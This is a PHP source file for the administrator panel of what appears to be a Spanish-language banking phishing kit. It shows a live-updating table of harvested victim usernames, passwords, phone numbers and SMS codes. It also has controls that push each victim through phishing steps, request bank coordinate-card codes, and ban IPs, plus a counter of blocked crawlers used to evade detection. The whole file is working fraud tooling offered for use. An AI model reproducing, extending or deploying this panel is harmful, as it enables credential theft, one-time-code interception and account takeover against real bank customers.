<?php
session_start();
include "../helpers/functions.php";
include "../helpers/class/UserInfo.php";
include './config/config.php';
include './config/db.class.php';
include "./config/Panel.php";
include "./config/User.php";

$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);

if (!isset($_SESSION["ok"])) {
    Panel::redirectToLogin();
}

include "config/top.php";

if (isset($_GET["logout"])) {
    Panel::redirectToLogin();
}

if (isset($_GET["cleardb"])) {
    $db->delete($userclass->clearDb());
    Panel::redirectToPanel();
}

if (isset($_GET["step"])) {
    @$step = urldecode($_GET["step"]);
    @$id   = urldecode($_GET["id"]);

    $redirect = true;
    switch ($_GET["step"]) {
        case 16:
            $SQL = $db->fetch($userclass->getUserIp($id));
            createF("IPBam.txt", $SQL['ip']);
            $db->update($userclass->updateStep($id, $step));
            break;
        case 99:
            $db->delete($userclass->deleteUser($id));
            break;
        default:
            $db->update($userclass->updateStep($id, $step));
            break;
    }
    $checkRedirect = ($redirect) ? Panel::redirectToPanel() : false;
}

if (isset($_GET["coor"])) {
    $id = $_GET["coor"];
    $st = $_GET["step"];
    echo '
    <script>
        var coor=prompt("Igrese su clave de coordenada (ej: A2):");
        if( coor != null)
        {
            window.location.assign("?step=' . $st . '&id=' . $id . '&challenge="+coor);
        }
    </script>';
}
?>

<!--mind counter js start -->

<link type="text/css" rel="stylesheet" href="css/material.css"/>
<?php
include './counter/counter.php';
?>

<!-- mind counter js end -->



<script type="text/javascript">
    function refreshDivs(divid, secs, url) {
        var divid, secs, url, fetch_unix_timestamp;
        var xmlHttp;
        try {
            xmlHttp = new XMLHttpRequest();
        } catch (e) {
            try {
                xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                    alert("Tu explorador no soporta AJAX.");
                    return false;
                }
            }
        }
        fetch_unix_timestamp = function() {
            return parseInt(new Date().getTime().toString().substring(0, 10))
        }
        var timestamp = fetch_unix_timestamp();
        var nocacheurl = url;
        xmlHttp.onreadystatechange = function() {
            if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
                document.getElementById(divid).innerHTML = xmlHttp.responseText;
                setTimeout(function() {
                    refreshDivs(divid, secs, url);
                }, secs * 1000);
            }
        }
        xmlHttp.open("GET", nocacheurl, true);
        xmlHttp.send(null);
    }
    window.onload = function startrefresh() {
        refreshDivs('panelxd', 1, 'backend.php?page=<?= $page = (isset($_GET['page'])) ? $_GET['page'] : '1' ?>');
    }
</script>
<body>
    <div id="main-wrapper" data-sidebartype="mini-sidebar" class="">
        <header class="topbar" data-navbarbg="skin5">
            <nav class="navbar top-navbar navbar-expand-md navbar-dark">
                <div class="navbar-header" data-logobg="skin5">
                    <a class="navbar-brand" href="https://t.me/GoogleXcoder">
                        <b class="logo-icon p-l-10">
                            <img src="dist/logo-icon.png"  class="light-logo">
                            <b style="color: red"></b>
                        </b>
                    </a>
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="?cleardb" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">LimpiarDB</a>
                    <a class="topbartoggler d-block d-md-none waves-effect waves-light" href="?logout" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">Cerrar sesión</a>
                </div>
                <div class="navbar-collapse collapse" id="navbarSupportedContent" data-navbarbg="skin5">
                    <ul class="navbar-nav float-left mr-auto">
                        <li class="nav-item d-none d-md-block">&nbsp;</li>
                        <li class="nav-item d-none d-md-block"><a class="nav-link dropdown-toggle" target="_blank" href="unbaner.php" id="navbarDropdown">
                        <span class="d-none d-md-block">BLACK LIST</span>
                            </a></li>
                    </ul>
                    <ul class="navbar-nav float-right">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="?cleardb" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Clear DATA BASE</a>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-muted waves-effect waves-dark pro-pic" href="?logout" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Exit</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>   
                    </div>
                </div>


<!-- counter js start -->

            <center>
         
        
    <div class="col s12 m12 maincrypt"><br>

  <div class="cardx2">
    
    <div>
      <div class="balance">Total Visitors</div>
      <div class="amount"><?php echo getUniqueVisitor();?></div>
 
    </div>

 
  </div>
  <div class="cardx2">
    
    <div>
      <div class="balance">Crawnler Block</div>
      <div class="amount"><?php echo getBlocked(); ?>

      

</center>
<!-- counter js end -->

                    <div class="col-12">
                        <div class="card" >
                            <div class="">
                              
                            </div>
                            <div class="table-responsive">
                                <table class="table">
                                    <thead class="thead-light">
                                        <tr>
                                            <!-- <th scope="col">Ping</th> -->
                                            <th scope="col">Ping</th>
                                            <th scope="col">USER</th>
                                            <th scope="col">PASS</th>
                                            <th scope="col">PHONE</th>
                                            <th scope="col">LINK</th>
                                            <th scope="col">EXTRA</th>
                                            <th scope="col">EXTRA</th>
                                            
                                            <th scope="col">SMS</th>
                                            <th scope="col">Accion</th>
                                        </tr>
                                    </thead>
                                    <tbody class="customtable" id="responsetable">
                                    <tbody id="panelxd"></tbody>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
    </div>

    
</body>
</html>